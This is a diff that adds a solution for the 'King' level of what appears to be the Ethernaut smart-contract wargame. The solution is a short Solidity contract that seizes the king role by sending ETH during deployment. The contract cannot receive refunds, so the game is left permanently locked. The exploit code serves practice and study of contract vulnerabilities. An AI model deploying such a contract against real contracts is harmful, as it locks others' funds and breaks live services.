@@ -169,6 +169,24 @@ contract Force {
 
 ```
 
+## 9. King
+
+Create a new contract: 
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    
+    constructor (address contrac) public payable {
+        contrac.call{ value: msg.value }("");
+    }
+    
+}
+```
+Send >0.001 ETH while deploying.
+
 
 
 
